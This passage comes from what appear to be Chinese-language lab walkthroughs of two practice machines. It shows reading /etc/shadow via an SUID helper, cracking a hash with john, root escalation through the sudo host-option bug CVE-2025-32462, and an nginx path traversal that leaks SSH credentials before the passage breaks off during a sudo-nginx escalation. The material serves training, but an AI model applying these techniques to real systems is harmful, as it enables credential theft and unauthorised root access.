responsibility.</span><br><br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> www-data:<br></code></pre></td></tr></table></figure><h2 id="1、查看具有suid权限的文件"><a href="#1、查看具有suid权限的文件" class="headerlink" title="1、查看具有suid权限的文件"></a>1、查看具有suid权限的文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sudo:/var/www/html$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/usr/bin/chsh<br>/usr/bin/read_file<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/umount<br>/usr/bin/pkexec<br>/usr/bin/sudo<br>/usr/bin/passwd<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/libexec/polkit-agent-helper-1<br></code></pre></td></tr></table></figure><p>找到一个文件<code>/usr/bin/read_file</code></p><p>或是使用<code>linpeas.sh</code>脚本跑一编，也可以看到文件<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507111517302.png"></p><p>查看使用方法，发现只可以读取<code>/etc/</code>下面的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sudo:/tmp$ /usr/bin/read_file -h<br>Usage: /usr/bin/read_file -f &lt;filepath&gt;<br>Options:<br>  -h         Show this <span class="hljs-built_in">help</span> message<br>  -f &lt;file&gt;  Specify the file to view (must be under /etc)<br><br>Security restrictions:<br>  - File path must start with /etc/<br>  - Symbolic links and path traversal are blocked<br>  - Only regular files can be <span class="hljs-built_in">read</span><br></code></pre></td></tr></table></figure><ul><li>读取<code>/etc/shadow</code>，找到root用户和eecho用户的密码哈希值<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sudo:/tmp$ /usr/bin/read_file -f /etc/shadow root:$y$j9T<span class="hljs-variable">$8u7tw</span>.ivXZkGdXyV0Fs.d/<span class="hljs-variable">$FfzoOYYu8sRq7K2smsiRh5UGsVU2mI8</span>.Q3Vmk0VtzUA:20190:0:99999:7:::<br>daemon:*:20166:0:99999:7:::<br>bin:*:20166:0:99999:7:::<br>sys:*:20166:0:99999:7:::<br><span class="hljs-built_in">sync</span>:*:20166:0:99999:7:::<br>games:*:20166:0:99999:7:::<br>man:*:20166:0:99999:7:::<br>lp:*:20166:0:99999:7:::<br>mail:*:20166:0:99999:7:::<br>news:*:20166:0:99999:7:::<br>uucp:*:20166:0:99999:7:::<br>proxy:*:20166:0:99999:7:::<br>www-data:*:20166:0:99999:7:::<br>backup:*:20166:0:99999:7:::<br>list:*:20166:0:99999:7:::<br>irc:*:20166:0:99999:7:::<br>gnats:*:20166:0:99999:7:::<br>nobody:*:20166:0:99999:7:::<br>_apt:*:20166:0:99999:7:::<br>systemd-timesync:*:20166:0:99999:7:::<br>systemd-network:*:20166:0:99999:7:::<br>systemd-resolve:*:20166:0:99999:7:::<br>systemd-coredump:!!:20166::::::<br>messagebus:*:20166:0:99999:7:::<br>sshd:*:20166:0:99999:7:::<br>eecho:$6<span class="hljs-variable">$mL</span>.9/fVsBqItNR..<span class="hljs-variable">$GyJfKOjLcovjApxygZ79CjKcqJmJ37jC8y9KeLq81fLAnNCYVP1Nw9d8Dp9pZi</span>/l3CWJ3PHL1l/Hld3sFmZoQ.:20278:0:99999:7:::<br></code></pre></td></tr></table></figure></li></ul><h2 id="2、获取eecho用户的权限"><a href="#2、获取eecho用户的权限" class="headerlink" title="2、获取eecho用户的权限"></a>2、获取eecho用户的权限</h2><p>对eecho用户的哈希值进行爆破，找到密码<code>alexis15</code>，root用户由于使用<code>yecrypt</code>加密，无法进行破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sudo]<br>└─# john --format=crypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt  <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (crypt, generic crypt(3) [?/64])<br>Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 6 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (algorithm specific iterations) is 5000 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 8 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>alexis15         (eecho)     <br>1g 0:00:00:33 DONE (2025-07-11 15:40) 0.02955g/s 1478p/s 1478c/s 1478C/s bobocel..Undertaker<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure><p>连接eecho用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sudo]<br>└─# ssh eecho@192.168.2.53   <br>eecho@192.168.2.53<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux Sudo 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Fri Jul 11 03:41:05 2025 from 192.168.2.4</span><br><span class="hljs-string">eecho@Sudo:~$ id</span><br><span class="hljs-string">uid=1000(eecho) gid=1000(eecho) groups=1000(eecho)</span><br></code></pre></td></tr></table></figure><p>尝试读取<code>/etc/sudoers</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">eecho@Sudo:~$ /usr/bin/read_file -f /etc/sudoers<br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This file MUST be edited with the &#x27;visudo&#x27; command as root.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Please consider adding local content in /etc/sudoers.d/ instead of</span><br><span class="hljs-comment"># directly modifying this file.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># See the man page for details on how to write a sudoers file.</span><br><span class="hljs-comment">#</span><br>Defaults        env_reset<br>Defaults        mail_badpass<br>Defaults        secure_path=<span class="hljs-string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><br><br><span class="hljs-comment"># Host alias specification</span><br><br><span class="hljs-comment"># User alias specification</span><br><br><span class="hljs-comment"># Cmnd alias specification</span><br><br><span class="hljs-comment"># User privilege specification</span><br>root    ALL=(ALL:ALL) ALL<br><br><span class="hljs-comment"># Allow members of group sudo to execute any command</span><br>%<span class="hljs-built_in">sudo</span>   ALL=(ALL:ALL) ALL<br>eecho Dashazi = NOPASSWD:ALL<br><span class="hljs-comment"># See sudoers(5) for more information on &quot;@include&quot; directives:</span><br><br>@includedir /etc/sudoers.d<br></code></pre></td></tr></table></figure><p>发现<code>eecho Dashazi = NOPASSWD:ALL</code>，用户eecho在主机Dashazi上可以无密码运行所有命令</p><p>直接进行提权即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"> eecho@Sudo:~$ <span class="hljs-built_in">sudo</span> -h Dashazi -i<br><span class="hljs-built_in">sudo</span>: unable to resolve host Dashazi: Temporary failure <span class="hljs-keyword">in</span> name resolution<br>root@Sudo:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Sudo:~# <span class="hljs-built_in">cat</span> root.txt <br>flag&#123;root&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、-CVE-2025-32462提权"><a href="#1、-CVE-2025-32462提权" class="headerlink" title="1、 CVE-2025-32462提权"></a>1、 CVE-2025-32462提权</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-32462">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-32462</a><br>Sudo 的 host（<code>-h</code>或<code>--host</code>）选项旨在与 list 选项（<code>-l</code>或<code>--list</code>）结合使用，以列出用户在当前主机以外的其他主机上的 sudo 权限。然而，由于存在一个 bug，它并不局限于列出权限，还可以在通过 运行命令<code>sudo</code>或使用 编辑文件 时使用<code>sudoedit</code>。根据 sudoers 文件中的规则，这可能允许本地权限提升攻击。</p><ul><li><p><strong>受影响的 Sudo 版本：</strong><br>Sudo 版本 1.8.8 至 1.9.17 均受到影响。</p></li><li><p><strong>细节：</strong><br>sudo 的<code>-h</code>( <code>--host</code>) 选项旨在列出用户在当前主机以外的其他主机上的 sudo 权限。它只能与 <code>-l</code>( <code>--list</code>) 选项配合使用。</p></li></ul><p>该漏洞实际上使得 sudoers 规则的主机名部分变得无关紧要，因为用户可以自行设置评估规则时要使用的主机。用户仍然必须列在 sudoers 文件中，但他们不需要拥有当前主机的条目。</p><p>例如，给定 sudoers 规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">alice cerebus = ALL<br></code></pre></td></tr></table></figure><p>用户<strong>alice</strong>可以<code>sudo -h cerebus id</code>在任何主机上运行，而不仅仅是_cerebus_。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">alice@hades$ sudo -l<br>Sorry, user alice may not run sudo on hades.<br><br>alice@hades$ sudo -l -h cerebus<br>User alice may run the following commands on cerebus:<br>    (root) ALL<br><br>alice@hades$ sudo -h cerebus id<br>uid=0(root) gid=0(root) groups=0(root)<br></code></pre></td></tr></table></figure><ul><li><strong>影响：</strong><br>包含主机字段并非“当前主机”或_“全部”规则的 Sudoers 文件会受到影响。这主要影响使用分发到多台计算机的通用 sudoers 文件的站点。使用基于 LDAP 的 sudoers（包括 SSSD）的站点也同样受到影响。</li></ul><p>例如，如下 sudoers 规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">bob ALL = ALL<br></code></pre></td></tr></table></figure><p>不受影响，因为主机_ALL_已经匹配任何主机，但是像这样的规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">alice cerebus = ALL<br></code></pre></td></tr></table></figure><p>即使当前主机不是cerebus_ ，也可以允许用户<strong>alice</strong>运行任何命令。</p>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Tiny File Manager</tag>
      
      <tag>CVE-2025-32462</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Config</title>
    <link href="/Maze-sec/Config/"/>
    <url>/Maze-sec/Config/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/config]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 12:51 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00057s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00026s latency).<br>MAC Address: 08:00:27:F5:57:69 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.49<br>Host is up (0.00059s latency).<br>MAC Address: 08:00:27:34:0E:CA (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.12 seconds<br></code></pre></td></tr></table></figure><p>IP地址为：<code>192.168.2.49</code></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/config]<br>└─# nmap --min-rate 10000 -p- 192.168.2.49                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 12:52 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.49<br>Host is up (0.0014s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:34:0E:CA (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 38.34 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/config]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.49<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 12:54 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.49<br>Host is up (0.00070s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    nginx 1.18.0<br>|_http-server-header: nginx/1.18.0<br>|_http-title: ConfigMaster - \xE6\x99\xBA\xE8\x83\xBD\xE8\xBF\x90\xE7\xBB\xB4\xE9\x85\x8D\xE7\xBD\xAE\xE7\xAE\xA1\xE7\x90\x86\xE5\xB9\xB3\xE5\x8F\xB0<br>MAC Address: 08:00:27:34:0E:CA (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.52 seconds<br></code></pre></td></tr></table></figure><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/config]<br>└─# nmap -sU --top-ports 100 192.168.2.49                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-08 12:56 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.49<br>Host is up (0.0012s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:34:0E:CA (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 109.08 seconds<br></code></pre></td></tr></table></figure><p>没有开放的端口</p><h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><p>访问80端口，是一个管理平台<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507092106184.png"></p><h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/config]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.49 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.49<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 21720]<br>/config               (Status: 301) [Size: 169] [--&gt; http://192.168.2.49/config/]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>发现目录<code>/config/</code>，尝试访问，发现和默认页面一致<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507092107593.png"></p><h2 id="2、nginx目录穿越"><a href="#2、nginx目录穿越" class="headerlink" title="2、nginx目录穿越"></a>2、nginx目录穿越</h2><p>通过指纹识别，发现web服务器是由<code>Nginx1.18</code>搭建的，查看历史漏洞版本，发现存在一个目录穿越漏洞，尝试靶机是否存在，返回403，证明可以遍历目录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507092114600.png"></p><p>再进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/config]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.49/config../ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.49/config../<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/html                 (Status: 301) [Size: 169] [--&gt; http://192.168.2.49/config../html/]<br>/config.txt           (Status: 200) [Size: 41]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>发现目录下面存在一个<code>config.txt</code>，进行访问，找到ssh凭证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/config]<br>└─# curl http://192.168.2.49/config../config.txt<br>SSH Credentials: mikannse/mikannsebyebye<br></code></pre></td></tr></table></figure><h1 id="四、获取USER权限"><a href="#四、获取USER权限" class="headerlink" title="四、获取USER权限"></a>四、获取USER权限</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/config]<br>└─# ssh mikannse@192.168.2.49<br>mikannse@192.168.2.49<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">mikannse@Config:~$ id</span><br><span class="hljs-string">uid=1000(mikannse) gid=1000(mikannse) groups=1000(mikannse)</span><br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mikannse@Config:~$ <span class="hljs-built_in">cat</span> user.txt <br>flag&#123;user-530773d6-5951-11f0-89d9-836ccaf94d6b&#125;<br></code></pre></td></tr></table></figure><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><p>执行<code>sudo -l</code>，发现可以执行<code>/home/mikannse/mikannse.conf</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mikannse@Config:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> mikannse on Config:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User mikannse may run the following commands on Config:<br>    (root) NOPASSWD: /usr/sbin/nginx -c /home/mikannse/mikannse.conf<br></code></pre></td></tr></table></figure><p>尝试修改文件里面的内容，发现没有权限去修改，先把文件复制到另一个文件，然后删除文件，再重新创建相同文件名写入文件内容即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">mikannse@Config:~$ vi a //将mikannse.conf里面的内容写入带a中<br>mikannse@Config:~$ <span class="hljs-built_in">rm</span> mikannse.conf  //删除文件<br><span class="hljs-built_in">rm</span>: remove write-protected regular file <span class="hljs-string">&#x27;mikannse.conf&#x27;</span>? y<br>mikannse@Config:~$ vi mikannse.conf //重新写入内容<br>mikannse@Config:~$ <span class="hljs-built_in">ls</span> -la<br>total 44<br>drwx------ 2 mikannse mikannse 4096 Jul  9 09:47 .<br>drwxr-xr-x 3 root     root     4096 Jul  4 23:36 ..<br>-rw-r--r-- 1 mikannse mikannse  551 Jul  9 09:46 a<br>-rw-r--r-- 1 mikannse mikannse  175 Jul  4 23:37 banner.txt<br>lrwxrwxrwx 1 root     root        9 Jul  4 23:40 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 mikannse mikannse  220 Jul  4 23:36 .bash_logout<br>-rw-r--r-- 1 mikannse mikannse 3526 Jul  4 23:36 .bashrc<br>-rw------- 1 mikannse mikannse   33 Jul  5 00:50 .lesshst<br>-rw-r--r-- 1 mikannse mikannse  551 Jul  9 09:47 mikannse.conf<br>-rw-r--r-- 1 mikannse mikannse  847 Jul  4 23:38 .profile<br>-rw-r--r-- 1 mikannse mikannse    0 Jul  9 09:45 tmp<br>-rw-r--r-- 1 root     root       48 Jul  4 23:37 user.txt<br>-rw------- 1 mikannse mikannse 1777 Jul  9 09:47 .viminfo<br></code></pre></td></tr></table></figure><h2 